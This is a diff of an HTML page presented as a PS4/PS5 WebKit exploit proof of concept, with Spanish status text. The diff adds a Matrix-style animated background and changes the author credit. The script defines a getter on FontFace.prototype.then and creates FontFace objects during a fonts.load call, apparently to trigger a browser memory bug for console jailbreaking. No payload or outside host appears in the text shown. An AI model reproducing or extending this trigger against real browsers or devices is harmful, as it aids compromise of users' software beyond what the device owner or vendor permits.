@@ -2,49 +2,93 @@
 <html lang="es">
 <head>
     <meta charset="utf-8">
-    <title>PS4 Exploit</title>
+    <title>PS4/PS5 WebKit Exploit</title>
     <style>
         body {
-            background: linear-gradient(to bottom, #0a0a0a, #000000);
+            margin: 0;
+            padding: 0;
+            background: #000;
             color: #00ff00;
             font-family: 'Courier New', monospace;
-            text-align: center;
-            padding: 60px 20px;
-            margin: 0;
-            height: 100vh;
             overflow: hidden;
+            height: 100vh;
+        }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+            opacity: 0.15;
+        }
+        .content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding-top: 80px;
         }
         h1 {
             color: #00ff41;
-            font-size: 32px;
-            text-shadow: 0 0 10px #00ff41;
-            margin-bottom: 20px;
+            font-size: 30px;
+            text-shadow: 0 0 15px #00ff41;
+            margin: 10px;
         }
         p {
             color: #00cc33;
-            font-size: 20px;
-            margin: 15px 0;
-        }
-        .status {
-            margin-top: 40px;
             font-size: 18px;
-            color: #00ff80;
+            margin: 8px;
         }
     </style>
 </head>
 <body>
-    <h1>PS4 / PS5 WebKit Exploit</h1>
-    <p>by NanospeedGamerYT</p>
-    <p class="status">Cargando exploit... No cierres esta página</p>
+
+    <canvas id="matrix"></canvas>
+
+    <div class="content">
+        <h1>PS4 / PS5 WebKit Exploit</h1>
+        <p>PoC by <strong>ntfargo</strong></p>
+        <p>Adaptado para prueba</p>
+        <p style="margin-top: 40px; color:#00ff80;">Cargando exploit... No cierres la página</p>
+    </div>
 
     <script>
+        // === MATRIX BACKGROUND ===
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+
+        const chars = '01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 35);
+
+        // === EXPLOIT ===
         let triggered = false;
 
         Object.defineProperty(FontFace.prototype, 'then', {
             get() {
                 if (!triggered) {
                     triggered = true;
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 12; i++) {
                         new FontFace('x' + i, 'local(Arial)', { unicodeRange: 'U+0041-005A' });
                     }
                 }
@@ -56,10 +100,6 @@
             const ff = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041-005A' });
             document.fonts.add(ff);
             document.fonts.load('1em x', 'ABC').catch(() => {});
-
-            setTimeout(() => {
-                console.log("%c🚀 Exploit ejecutado", "color:lime;font-size:20px");
-            }, 800);
         };
     </script>
 </body>
